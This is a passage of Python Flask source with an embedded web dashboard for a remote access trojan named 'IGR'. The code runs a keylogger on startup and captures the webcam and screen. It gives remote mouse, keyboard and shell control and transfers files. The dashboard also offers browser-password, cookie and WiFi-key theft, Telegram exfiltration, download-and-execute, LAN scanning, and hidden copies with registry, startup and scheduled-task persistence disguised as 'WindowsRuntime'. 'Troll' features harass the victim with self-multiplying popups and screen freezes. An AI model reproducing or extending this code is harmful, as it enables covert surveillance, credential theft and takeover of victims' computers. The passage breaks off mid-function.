                    await fetch('/api/control/mouse', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'click', button: 'left'})});
                };
                box.oncontextmenu = async (e) => {
                    e.preventDefault();
                    const rect = box.getBoundingClientRect();
                    const x = Math.round((e.clientX - rect.left) / rect.width * 1920);
                    const y = Math.round((e.clientY - rect.top) / rect.height * 1080);
                    await fetch('/api/control/mouse', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'move', x, y})});
                    await fetch('/api/control/mouse', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'click', button: 'right'})});
                };
                controlInterval = setInterval(async () => {
                    const res = await fetch(`/api/screen/stream?monitor=${currentMonitor}`);
                    const blob = await res.blob();
                    document.getElementById('controlStream').src = URL.createObjectURL(blob);
                }, 200);
                logActivity('Control started');
            }
        }
        async function typeOnHost() {
            const text = document.getElementById('typeText').value;
            await fetch('/api/control/keyboard', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'type', text})});
            logActivity('Typed: ' + text);
        }

        // Keylogger
        function startKeylogger() {
            fetch('/api/keylogger/get').then(r => r.json()).then(data => {
                if (data.full_log) document.getElementById('keylogBox').textContent = data.full_log;
                isKeyloggerOn = true;
                keylogInterval = setInterval(fetchKeylog, 500);
                logActivity('Keylogger active');
            });
            loadKeylogInfo();
        }
        async function loadKeylogInfo() {
            const res = await fetch('/api/keylogger/info');
            const data = await res.json();
            document.getElementById('keylogPath').textContent = data.path;
            const size = data.size;
            let sizeStr;
            if (size < 1024) sizeStr = size + ' B';
            else if (size < 1048576) sizeStr = (size / 1024).toFixed(1) + ' KB';
            else sizeStr = (size / 1048576).toFixed(2) + ' MB';
            document.getElementById('keylogSize').textContent = sizeStr;
        }
        async function fetchKeylog() {
            const res = await fetch('/api/keylogger/get');
            const data = await res.json();
            if (data.keys && data.keys.length > 0) {
                const box = document.getElementById('keylogBox');
                data.keys.forEach(k => { box.textContent += k; });
                box.scrollTop = box.scrollHeight;
                loadKeylogInfo();
            }
        }
        async function clearKeylog() {
            await fetch('/api/keylogger/clear', {method: 'POST'});
            document.getElementById('keylogBox').textContent = '';
            logActivity('Keylog cleared');
        }
        function downloadKeylogs() {
            window.location.href = '/api/keylogger/download';
            logActivity('Downloaded keylogs');
        }

        // Files
        async function listFiles() {
            const path = document.getElementById('filePath').value || 'C:\\\\';
            const res = await fetch('/api/files/list', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({path})});
            const data = await res.json();
            const list = document.getElementById('fileList');
            list.innerHTML = '';
            (data.files || []).forEach(file => {
                const item = document.createElement('div');
                item.className = 'file-item';
                item.innerHTML = `<span class="file-icon">${file.endsWith('/') || file.endsWith('\\\\') ? '[D]' : '[F]'}</span>${file}`;
                item.onclick = () => { document.getElementById('filePath').value = path.endsWith('\\\\') ? path + file : path + '\\\\' + file; };
                list.appendChild(item);
            });
            logActivity('Listed files');
        }
        function downloadFile() {
            const path = document.getElementById('filePath').value;
            window.location.href = `/api/files/download?path=${encodeURIComponent(path)}`;
            logActivity('Downloading file');
        }
        async function uploadFile() {
            const file = document.getElementById('fileInput').files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append('file', file);
            await fetch('/api/files/upload', {method: 'POST', body: formData});
            logActivity('Uploaded: ' + file.name);
        }

        // Shell
        async function executeCommand() {
            const cmd = document.getElementById('commandInput').value;
            const res = await fetch('/api/command/execute', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command: cmd})});
            const data = await res.json();
            document.getElementById('shellOutput').textContent = data.output;
            logActivity('Executed command');
        }

        // Audio
        async function speakText() {
            const text = document.getElementById('ttsText').value;
            await fetch('/api/audio/speak', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text})});
            logActivity('Speaking: ' + text);
        }
        async function playAudio() {
            const file = document.getElementById('audioFileInput').files[0];
            if (!file) { logActivity('No audio file selected'); return; }
            const formData = new FormData();
            formData.append('audio', file);
            await fetch('/api/audio/play', {method: 'POST', body: formData});
            logActivity('Playing audio');
        }
        async function stopAudio() {
            await fetch('/api/audio/stop', {method: 'POST'});
            logActivity('Audio stopped');
        }

        // Freeze
        async function freezeScreen(type) {
            await fetch('/api/screen/freeze', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'start'})});
            logActivity('Screen frozen (black)');
        }
        async function freezeScreenImg() {
            const file = document.getElementById('freezeImageInput').files[0];
            if (!file) { logActivity('No image selected'); return; }
            const formData = new FormData();
            formData.append('image', file);
            await fetch('/api/screen/freeze', {method: 'POST', body: formData});
            logActivity('Screen frozen with image');
        }
        async function unfreezeScreen() {
            await fetch('/api/screen/freeze', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'stop'})});
            logActivity('Screen unfrozen');
        }

        // Troll Popups
        async function sendPopup(type) {
            const title = document.getElementById('popupTitle').value || 'System';
            const text = document.getElementById('popupText').value || 'Error';
            await fetch('/api/troll/popup', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, title, text})});
            logActivity('Popup sent: ' + type);
        }
        async function stopPopups() {
            await fetch('/api/troll/popup/stop', {method: 'POST'});
            logActivity('All popups stopped');
        }

        // Fullscreen
        function toggleFullscreen(boxId) {
            const box = document.getElementById(boxId);
            if (box.classList.contains('fullscreen')) {
                box.classList.remove('fullscreen');
                document.exitFullscreen?.();
            } else {
                box.classList.add('fullscreen');
                box.requestFullscreen?.();
            }
        }
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') document.querySelectorAll('.stream-box.fullscreen').forEach(b => b.classList.remove('fullscreen'));
        });

        // ===== NEW TROLL FEATURES =====
        async function startJitter() {
            await fetch('/api/troll/mouse_jitter', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'start'})});
            logActivity('Mouse jitter started');
        }
        async function stopJitter() {
            await fetch('/api/troll/mouse_jitter', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'stop'})});
            logActivity('Mouse jitter stopped');
        }
        async function ghostType() {
            const text = document.getElementById('ghostText').value || 'Hello?';
            const interval = parseFloat(document.getElementById('ghostInterval').value) || 2;
            const count = parseInt(document.getElementById('ghostCount').value) || 1;
            await fetch('/api/troll/ghost_type', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({text, interval, count})});
            logActivity('Ghost typing: ' + text);
        }
        async function changeWallpaper() {
            const file = document.getElementById('wallpaperInput').files[0];
            if (!file) { logActivity('No wallpaper image selected'); return; }
            const formData = new FormData();
            formData.append('image', file);
            await fetch('/api/troll/wallpaper', {method:'POST', body:formData});
            logActivity('Wallpaper changed');
        }
        async function monitorOff() {
            await fetch('/api/troll/monitor', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'off'})});
            logActivity('Monitor turned off');
        }
        async function monitorOn() {
            await fetch('/api/troll/monitor', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'on'})});
            logActivity('Monitor turned on');
        }

        // ===== HARVEST =====
        async function harvestWifi() {
            document.getElementById('wifiBox').textContent = 'Extracting...';
            const res = await fetch('/api/harvest/wifi');
            const data = await res.json();
            document.getElementById('wifiBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
            logActivity('WiFi passwords dumped');
        }
        async function harvestChrome() {
            document.getElementById('chromeBox').textContent = 'Decrypting...';
            const res = await fetch('/api/harvest/chrome');
            const data = await res.json();
            document.getElementById('chromeBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
            logActivity('Chrome passwords decrypted');
        }
        async function harvestEdge() {
            document.getElementById('edgeBox').textContent = 'Decrypting...';
            const res = await fetch('/api/harvest/edge');
            const data = await res.json();
            document.getElementById('edgeBox').textContent = data.passwords ? data.passwords.join('\n') : 'None found';
            logActivity('Edge passwords decrypted');
        }
        async function harvestCookies() {
            document.getElementById('cookiesBox').textContent = 'Stealing...';
            const res = await fetch('/api/harvest/cookies');
            const data = await res.json();
            document.getElementById('cookiesBox').textContent = data.cookies ? data.cookies.join('\n') : 'None found';
            logActivity('Browser cookies stolen');
        }
        async function harvestSoftware() {
            document.getElementById('softwareBox').textContent = 'Listing...';
            const res = await fetch('/api/harvest/software');
            const data = await res.json();
            document.getElementById('softwareBox').textContent = data.software ? data.software.join('\n') : 'None found';
            logActivity('Software listed');
        }
        async function harvestRecent() {
            document.getElementById('recentBox').textContent = 'Getting...';
            const res = await fetch('/api/harvest/recent');
            const data = await res.json();
            document.getElementById('recentBox').textContent = data.documents ? data.documents.join('\n') : 'None found';
            logActivity('Recent documents listed');
        }
        async function harvestInventory() {
            const res = await fetch('/api/harvest/inventory');
            const data = await res.json();
            if (data.inventory) {
                const grid = document.getElementById('inventoryGrid');
                grid.style.display = 'grid';
                grid.innerHTML = '';
                const inv = data.inventory;
                const labels = {os:'OS',version:'Version',machine:'Arch',processor:'CPU',hostname:'Hostname',username:'User',domain:'Domain',arch:'Arch',cores:'Cores',fqdn:'FQDN',cpu_name:'CPU Name',ram_total_gb:'RAM (GB)',ram_used_pct:'RAM Used %',disk_size_gb:'Disk (GB)'};
                for (const [k,v] of Object.entries(inv)) {
                    const label = labels[k] || k;
                    grid.innerHTML += `<div class="info-card"><div class="info-label">${label}</div><div class="info-value" style="font-size:14px;">${v}</div></div>`;
                }
            }
            logActivity('System inventory scanned');
        }
        async function sendToTelegram() {
            const text = document.getElementById('telegramMsg').value || '';
            await fetch('/api/harvest/send_telegram', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'custom', text})});
            logActivity('Report sent to Telegram');
        }

        // ===== REMOTE =====
        async function downloadExec() {
            const url = document.getElementById('dlUrl').value;
            if (!url) { logActivity('No URL provided'); return; }
            await fetch('/api/remote/download_exec', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url})});
            logActivity('Downloaded & executed: ' + url);
        }
        async function selfUpdate() {
            await fetch('/api/remote/self_update', {method:'POST'});
            logActivity('Self update initiated');
        }
        async function searchFiles() {
            const root = document.getElementById('searchRoot').value || 'C:\\';
            const pattern = document.getElementById('searchPattern').value;
            if (!pattern) { logActivity('No search pattern'); return; }
            document.getElementById('searchBox').textContent = 'Searching...';
            const res = await fetch('/api/remote/file_search', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({root, pattern})});
            const data = await res.json();
            document.getElementById('searchBox').textContent = data.results ? data.results.join('\n') : 'No results';
            logActivity('File search: ' + pattern);
        }
        async function openBrowser() {
            const url = document.getElementById('browserUrl').value;
            if (!url) { logActivity('No URL'); return; }
            await fetch('/api/remote/browser_open', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url})});
            logActivity('Opened browser: ' + url);
        }
        async function killProcess() {
            const name = document.getElementById('killProcess').value;
            if (!name) { logActivity('No process name'); return; }
            await fetch('/api/remote/process_kill', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name})});
            logActivity('Killed process: ' + name);
        }
        async function scanLan() {
            document.getElementById('lanBox').textContent = 'Scanning... (this may take a minute)';
            try {
                const res = await fetch('/api/network/lan_scan');
                const data = await res.json();
                document.getElementById('lanBox').textContent = data.devices ? data.devices.join('\n') : 'No devices found';
            } catch(e) {
                document.getElementById('lanBox').textContent = 'Scan failed or timed out';
            }
            logActivity('LAN scanned');
        }

        // ===== STEALTH =====
        async function stealthSpread() {
            document.getElementById('spreadBox').textContent = 'Spreading...';
            const res = await fetch('/api/stealth/spread');
            const data = await res.json();
            document.getElementById('spreadBox').textContent = data.success ? `Done. ${data.copies} copies created in hidden locations.` : 'Failed: ' + (data.error || 'unknown');
            logActivity('Internal spread: ' + (data.copies || 0) + ' copies');
        }
        async function stealthRegistry() {
            document.getElementById('registryBox').textContent = 'Adding...';
            const res = await fetch('/api/stealth/registry');
            const data = await res.json();
            document.getElementById('registryBox').textContent = data.success ? 'Registry key added. IGR will start on login.' : 'Failed: ' + (data.error || 'access denied');
            logActivity('Registry persistence: ' + (data.success ? 'added' : 'failed'));
        }
        function loadPersistenceInfo() {
            const info = document.getElementById('persistenceInfo');
            info.innerHTML = `<strong>Startup Folder:</strong> WindowsRuntime.lnk<br><strong>Scheduled Task:</strong> WindowsRuntime (at boot)<br><strong>Registry Run:</strong> HKCU\\...\\Run\\WindowsRuntime<br><strong>Internal Copies:</strong> 4 hidden locations<br><strong>Watchdog:</strong> Monitors process every 30s`;
        }
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    """Serve the IGR control dashboard."""
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/auth', methods=['POST'])
def auth():
    """Authenticate with password."""
    try:
        data = request.get_json()
        password = data.get('password', '')
        if password == DASHBOARD_PASSWORD:
            return jsonify({'success': True})
        return jsonify({'success': False})
    except:
        return jsonify({'success': False})

@app.route('/api/audio/play', methods=['POST'])
def play_audio():
    """Play uploaded audio file in-memory, no disk traces."""
    try:
        audio_file = request.files.get('audio')
        if not audio_file:
            return jsonify({'success': False, 'status': 'No audio file'})
        audio_data = audio_file.read()
        audio_ext = os.path.splitext(audio_file.filename)[1] or '.wav'
        tmp_path = os.path.join(KEYLOG_DIR, f"_tmp_audio{audio_ext}")
        with open(tmp_path, 'wb') as f:
            f.write(audio_data)
        def _play_and_cleanup(path):
            try:
                subprocess.run(['powershell', '-Command',
                    f'(New-Object Media.SoundPlayer "{path}").PlaySync()'],
                    capture_output=True, timeout=60, creationflags=0x08000000)
            except:
                try:
                    import winsound
                    winsound.PlaySound(path, winsound.SND_FILENAME)
                except:
                    pass
            try:
                os.remove(path)
            except:
                pass
        threading.Thread(target=_play_and_cleanup, args=(tmp_path,), daemon=True).start()
        return jsonify({'success': True, 'status': 'Playing audio'})
    except Exception as e:
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/audio/stop', methods=['POST'])
def stop_audio():
    """Stop audio playback."""
    return jsonify({'success': True, 'status': 'Stopped'})

_popup_running = False

def _make_tk_popup(p_title: str, p_text: str, p_type: str, x: int = -1, y: int = -1):
    """Create a tkinter popup at optional x,y position. On close, hydra spawns 2 more."""
    global _popup_running
    import tkinter as tk
    root = tk.Tk()
    root.title(p_title)
    root.configure(bg='#1a1a2e')
    root.resizable(False, False)
    root.attributes('-topmost', True)
    root.overrideredirect(False)
    
    label = tk.Label(root, text=p_text, bg='#1a1a2e', fg='#e0e0e0',
                     font=('Segoe UI', 11), wraplength=280, justify='center',
                     padx=20, pady=15)
    label.pack()
    
    btn_frame = tk.Frame(root, bg='#1a1a2e')
    btn_frame.pack(pady=(0, 10))
    
    if p_type == 'persistent':
        def on_ok():
            root.destroy()
            if _popup_running:
                time.sleep(0.05)
                threading.Thread(target=_make_tk_popup, args=(p_title, p_text, p_type), daemon=True).start()
        btn = tk.Button(btn_frame, text="OK", command=on_ok, width=10,
                        bg='#a855f7', fg='white', font=('Segoe UI', 10, 'bold'),
                        relief='flat', cursor='hand2')
        btn.pack()
    elif p_type == 'hydra':
        def on_ok():
            root.destroy()
            if _popup_running:
                import random
                sw = root.winfo_screenwidth()
                sh = root.winfo_screenheight()
                for _ in range(2):
                    nx = random.randint(0, max(sw - 300, 0))
                    ny = random.randint(0, max(sh - 150, 0))
                    threading.Thread(target=_make_tk_popup, args=(p_title, p_text, 'hydra', nx, ny), daemon=True).start()
        btn = tk.Button(btn_frame, text="OK", command=on_ok, width=10,
                        bg='#dc2626', fg='white', font=('Segoe UI', 10, 'bold'),
                        relief='flat', cursor='hand2')
        btn.pack()
    else:
        btn = tk.Button(btn_frame, text="OK", command=root.destroy, width=10,
                        bg='#a855f7', fg='white', font=('Segoe UI', 10, 'bold'),
                        relief='flat', cursor='hand2')
        btn.pack()
    
    root.update_idletasks()
    w = root.winfo_width()
    h = root.winfo_height()
    if x >= 0 and y >= 0:
        root.geometry(f'+{x}+{y}')
    else:
        sx = (root.winfo_screenwidth() - w) // 2
        sy = (root.winfo_screenheight() - h) // 2
        root.geometry(f'+{sx}+{sy}')
    
    root.mainloop()

@app.route('/api/troll/popup', methods=['POST'])
def troll_popup():
    """Show popup: normal (one-shot), persistent (reappears), hydra (closes -> spawns 2)."""
    global _popup_running
    try:
        data = request.get_json()
        popup_type = data.get('type', 'normal')
        title = data.get('title', 'System')
        text = data.get('text', 'Error')
        _popup_running = True
        threading.Thread(target=_make_tk_popup, args=(title, text, popup_type), daemon=True).start()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/troll/popup/stop', methods=['POST'])
def troll_popup_stop():
    """Stop all persistent/hydra popups."""
    global _popup_running
    _popup_running = False
    return jsonify({'success': True})

@app.route('/api/audio/speak', methods=['POST'])
def speak_text():
    """Speak text using system TTS."""
    try:
        data = request.get_json()
        text = data.get('text', '')
        subprocess.run(['powershell', '-Command', f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text}")'], capture_output=True, creationflags=0x08000000)
        return jsonify({'success': True, 'status': 'Speaking: ' + text})
    except Exception as e:
        return jsonify({'success': False, 'status': str(e)})

keylogger_running = False
keylog_buffer = []
keylog_full_log = ""

def save_keylog(k):
    """Save keylog to file and buffer."""
    global keylog_full_log
    keylog_buffer.append(k)
    keylog_full_log += k
    try:
        with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
            f.write(k)
    except:
        pass

def start_keylogger():
    """Start the global keylogger on backend startup."""
    global keylogger_running
    keylogger_running = True
    
    # Load existing logs from file
    global keylog_full_log
    try:
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
                keylog_full_log = f.read()
    except:
        pass
    
    def keylog_thread():
        from pynput import keyboard
        def on_press(key):
            if not keylogger_running:
                return False
            try:
                k = str(key.char)
            except:
                k = str(key)
                short_keys = {
                    'Key.space': ' ', 'Key.enter': '\n', 'Key.tab': '\t',
                    'Key.backspace': '<-', 'Key.delete': '[del]',
                    'Key.shift': '[sh]', 'Key.shift_l': '[sh]', 'Key.shift_r': '[sh]',
                    'Key.ctrl_l': '[cl]', 'Key.ctrl_r': '[cr]',
                    'Key.alt_l': '[al]', 'Key.alt_r': '[ar]',
                    'Key.cmd': '[cmd]', 'Key.cmd_l': '[cmd]', 'Key.cmd_r': '[cmd]',
                    'Key.caps_lock': '[cap]', 'Key.num_lock': '[num]',
                    'Key.esc': '[esc]', 'Key.home': '[hom]',
                    'Key.end': '[end]', 'Key.page_up': '[pu]', 'Key.page_down': '[pd]',
                    'Key.up': '[up]', 'Key.down': '[dn]', 'Key.left': '[lt]', 'Key.right': '[rt]',
                    'Key.f1': '[F1]', 'Key.f2': '[F2]', 'Key.f3': '[F3]', 'Key.f4': '[F4]',
                    'Key.f5': '[F5]', 'Key.f6': '[F6]', 'Key.f7': '[F7]', 'Key.f8': '[F8]',
                    'Key.f9': '[F9]', 'Key.f10': '[F10]', 'Key.f11': '[F11]', 'Key.f12': '[F12]',
                    'Key.insert': '[ins]', 'Key.print_screen': '[psc]',
                    'Key.scroll_lock': '[scl]', 'Key.pause': '[pau]',
                    'Key.menu': '[men]',
                }
                k = short_keys.get(k, f'[{k[4:].upper()[:3]}]' if k.startswith('Key.') else k)
            save_keylog(k)
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    
    threading.Thread(target=keylog_thread, daemon=True).start()

@app.route('/api/hardware/list')
def hardware_list():
    """List available hardware devices."""
    webcams = []
    microphones = []
    
    try:
        import cv2
        cv2.setLogLevel(0)
        for index in range(3):
            try:
                cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                if cap.isOpened():
                    ret, _ = cap.read()
                    if ret:
                        webcams.append(f"Camera {index}")
                    cap.release()
            except:
                pass
    except:
        pass
    
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        for i in range(p.get_device_count()):
            dev = p.get_device_info_by_index(i)
            if dev['maxInputChannels'] > 0:
                microphones.append(dev['name'][:30])
        p.terminate()
    except:
        pass
    
    return jsonify({'webcams': webcams, 'microphones': microphones})

_webcam_state = {'cap': None, 'frame': None, 'lock': threading.Lock(), 'active': False, 'cam_index': -1}

def _webcam_capture_loop():
    """Background thread that continuously captures webcam frames."""
    global _webcam_state
    import cv2
    cv2.setLogLevel(0)
    while _webcam_state['active']:
        try:
            with _webcam_state['lock']:
                cap = _webcam_state['cap']
                if cap is not None and cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        _, buf = cv2.imencode('.jpg', frame)
                        _webcam_state['frame'] = buf.tobytes()
                    else:
                        _webcam_state['frame'] = None
        except:
            pass
        time.sleep(0.15)

@app.route('/api/webcam/stream')
def webcam_stream():
    """Stream webcam frame from background capture."""
    global _webcam_state
    try:
        cam_index = int(request.args.get('cam', 0))
        with _webcam_state['lock']:
            if _webcam_state['cam_index'] != cam_index or _webcam_state['cap'] is None:
                import cv2
                cv2.setLogLevel(0)
                if _webcam_state['cap'] is not None:
                    _webcam_state['cap'].release()
                _webcam_state['cap'] = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
                _webcam_state['cam_index'] = cam_index
                if not _webcam_state['cap'].isOpened():
                    _webcam_state['cap'] = None
                    return Response('', status=500)
                if not _webcam_state['active']:
                    _webcam_state['active'] = True
                    threading.Thread(target=_webcam_capture_loop, daemon=True).start()
            frame_data = _webcam_state['frame']
        if frame_data:
            return Response(frame_data, mimetype='image/jpeg')
        return Response('', status=500)
    except:
        return Response('', status=500)

@app.route('/api/webcam/stop', methods=['POST'])
def webcam_stop():
    """Stop webcam capture and release device."""
    global _webcam_state
    with _webcam_state['lock']:
        _webcam_state['active'] = False
        if _webcam_state['cap'] is not None:
            try:
                _webcam_state['cap'].release()
            except:
                pass
            _webcam_state['cap'] = None
        _webcam_state['frame'] = None
        _webcam_state['cam_index'] = -1
    return jsonify({'success': True})

@app.route('/api/keylogger/start', methods=['POST'])
def keylogger_start():
    """Start the global keylogger."""
    global keylogger_running
    if not keylogger_running:
        start_keylogger()
    return jsonify({'success': True})

@app.route('/api/keylogger/stop', methods=['POST'])
def keylogger_stop():
    """Stop the global keylogger."""
    global keylogger_running
    keylogger_running = False
    return jsonify({'success': True})

@app.route('/api/keylogger/get')
def keylogger_get():
    """Get keylogged keys."""
    global keylog_buffer, keylog_full_log
    keys = keylog_buffer.copy()
    keylog_buffer = []
    return jsonify({'keys': keys, 'full_log': keylog_full_log})

@app.route('/api/keylogger/clear', methods=['POST'])
def keylogger_clear():
    """Clear the keylogger log."""
    global keylog_buffer, keylog_full_log
    keylog_buffer = []
    keylog_full_log = ""
    try:
        if os.path.exists(KEYLOG_FILE):
            os.remove(KEYLOG_FILE)
    except:
        pass
    return jsonify({'success': True})

@app.route('/api/keylogger/download')
def keylogger_download():
    """Download all keylogs as file."""
    try:
        if os.path.exists(KEYLOG_FILE):
            return send_file(KEYLOG_FILE, as_attachment=True, download_name='keylogs.txt')
        return Response('No logs yet', mimetype='text/plain')
    except:
        return Response('Error reading logs', mimetype='text/plain', status=500)

@app.route('/api/keylogger/info')
def keylogger_info():
    """Get keylog file info."""
    try:
        file_size = 0
        if os.path.exists(KEYLOG_FILE):
            file_size = os.path.getsize(KEYLOG_FILE)
        return jsonify({
            'path': KEYLOG_FILE,
            'dir': KEYLOG_DIR,
            'size': file_size,
            'exists': os.path.exists(KEYLOG_FILE)
        })
    except:
        return jsonify({'path': 'Unknown', 'dir': 'Unknown', 'size': 0, 'exists': False})

@app.route('/api/control/mouse', methods=['POST'])
def control_mouse():
    """Control mouse movement and clicks."""
    try:
        data = request.get_json()
        action = data.get('action', '')
        x = data.get('x', 0)
        y = data.get('y', 0)
        button = data.get('button', 'left')
        
        from pynput.mouse import Controller, Button
        mouse = Controller()
        
        if action == 'move':
            mouse.position = (x, y)
        elif action == 'click':
            if button == 'left':
                mouse.click(Button.left)
            elif button == 'right':
                mouse.click(Button.right)
            elif button == 'middle':
                mouse.click(Button.middle)
        elif action == 'press':
            if button == 'left':
                mouse.press(Button.left)
            elif button == 'right':
                mouse.press(Button.right)
        elif action == 'release':
            if button == 'left':
                mouse.release(Button.left)
            elif button == 'right':
                mouse.release(Button.right)
        elif action == 'scroll':
            dx = data.get('dx', 0)
            dy = data.get('dy', 0)
            mouse.scroll(dx, dy)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/control/keyboard', methods=['POST'])
def control_keyboard():
    """Control keyboard input."""
    try:
        data = request.get_json()
        action = data.get('action', '')
        key = data.get('key', '')
        text = data.get('text', '')
        
        from pynput.keyboard import Controller, Key
        keyboard = Controller()
        
        if action == 'press' and key:
            if key.startswith('Key.'):
                keyboard.press(getattr(Key, key[4:]))
            else:
                keyboard.press(key)
        elif action == 'release' and key:
            if key.startswith('Key.'):
                keyboard.release(getattr(Key, key[4:]))
            else:
                keyboard.release(key)
        elif action == 'type' and text:
            keyboard.type(text)
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

_freeze_root = None

@app.route('/api/screen/freeze', methods=['POST'])
def screen_freeze():
    """Freeze screen with black or uploaded image, no disk traces."""
    global _freeze_root
    try:
        image_file = request.files.get('image')
        action = request.form.get('action', 'start') if image_file else (request.get_json(silent=True) or {}).get('action', 'start')
        
        if action == 'start':
            def show_overlay(img_bytes=None):
                global _freeze_root
                import tkinter as tk
                from PIL import Image, ImageTk
                
                root = tk.Tk()
                _freeze_root = root
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.configure(bg='black')
                root.overrideredirect(True)
                
                if img_bytes:
                    img = Image.open(io.BytesIO(img_bytes))
                    screen_width = root.winfo_screenwidth()
                    screen_height = root.winfo_screenheight()
                    img = img.resize((screen_width, screen_height))
                    photo = ImageTk.PhotoImage(img)
                    label = tk.Label(root, image=photo)
                    label.pack()
                
                root.mainloop()
                _freeze_root = None
            
            img_data = image_file.read() if image_file else None
            threading.Thread(target=show_overlay, args=(img_data,), daemon=True).start()
            return jsonify({'success': True})
        elif action == 'stop':
            def kill_overlay():
                global _freeze_root
                try:
                    if _freeze_root is not None:
                        _freeze_root.after(0, _freeze_root.destroy)
                except:
                    _freeze_root = None
            kill_overlay()
            return jsonify({'success': True})
        
        return jsonify({'success': False, 'error': 'Invalid action'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

CLOUDFLARED_PUBLIC_URL = ""

@app.route('/api/network/info')
def network_info():
    """Get host and client IP info."""
    try:
        host_ip = "127.0.0.1"
        hostname = socket.gethostname()
        local_ips = socket.gethostbyname_ex(hostname)[2]
        for ip in local_ips:
            if not ip.startswith('127.') and not ip.startswith('169.254.'):
                host_ip = ip
                break
        
        # Check for real client IP behind proxy/tunnel
        client_ip = request.headers.get('X-Forwarded-For', '')
        if client_ip:
            client_ip = client_ip.split(',')[0].strip()
        else:
            client_ip = request.headers.get('X-Real-IP', '')
        if not client_ip:
            client_ip = request.remote_addr or "Unknown"
        
        return jsonify({
            'host_ip': host_ip,
            'client_ip': client_ip,
            'hostname': hostname,
            'cloudflared_url': CLOUDFLARED_PUBLIC_URL
        })
    except:
        return jsonify({'host_ip': 'Unknown', 'client_ip': 'Unknown', 'hostname': 'Unknown'})

@app.route('/api/screen/monitors')
def screen_monitors():
    """List available monitors."""
    try:
        import ctypes
        monitors = []
        monitor_handles = []
        
        def callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
            rect = lprcMonitor.contents
            monitors.append({
                'id': len(monitors),
                'left': rect.left,
                'top': rect.top,
                'right': rect.right,
                'bottom': rect.bottom,
                'width': rect.right - rect.left,
                'height': rect.bottom - rect.top
            })
            return True
        
        class RECT(ctypes.Structure):
            _fields_ = [('left', ctypes.c_long), ('top', ctypes.c_long),
                        ('right', ctypes.c_long), ('bottom', ctypes.c_long)]
        
        MONITORENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p,
                                             ctypes.c_void_p, ctypes.POINTER(RECT), ctypes.c_double)
        
        ctypes.windll.user32.EnumDisplayMonitors(None, None,
            MONITORENUMPROC(callback), 0)
        
        if not monitors:
            try:
                from PIL import ImageGrab
                all_img = ImageGrab.grab()
                monitors.append({
                    'id': 0,
                    'left': 0, 'top': 0,
                    'right': all_img.width, 'bottom': all_img.height,
                    'width': all_img.width, 'height': all_img.height
                })
            except:
                monitors.append({'id': 0, 'left': 0, 'top': 0, 'right': 1920, 'bottom': 1080, 'width': 1920, 'height': 1080})
        
        return jsonify({'monitors': monitors, 'count': len(monitors)})
    except:
        try:
            from PIL import ImageGrab
            all_img = ImageGrab.grab()
            return jsonify({'monitors': [{'id': 0, 'left': 0, 'top': 0, 'right': all_img.width, 'bottom': all_img.height, 'width': all_img.width, 'height': all_img.height}], 'count': 1})
        except:
            return jsonify({'monitors': [{'id': 0, 'left': 0, 'top': 0, 'right': 1920, 'bottom': 1080, 'width': 1920, 'height': 1080}], 'count': 1})

@app.route('/api/screen/stream')
def screen_stream():
    """Stream screen capture."""
    try:
        from PIL import ImageGrab
        monitor_id = int(request.args.get('monitor', -1))
        if monitor_id >= 0:
            img = ImageGrab.grab(all_screens=True)
            resp = _get_monitor_list()
            if monitor_id < len(resp):
                m = resp[monitor_id]
                img = img.crop((m['left'], m['top'], m['right'], m['bottom']))
        else:
            img = ImageGrab.grab(all_screens=True)
        img_io = io.BytesIO()
        img.save(img_io, 'JPEG')
        img_io.seek(0)
        return Response(img_io.read(), mimetype='image/jpeg')
    except:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img_io = io.BytesIO()
            img.save(img_io, 'JPEG')
            img_io.seek(0)
            return Response(img_io.read(), mimetype='image/jpeg')
        except:
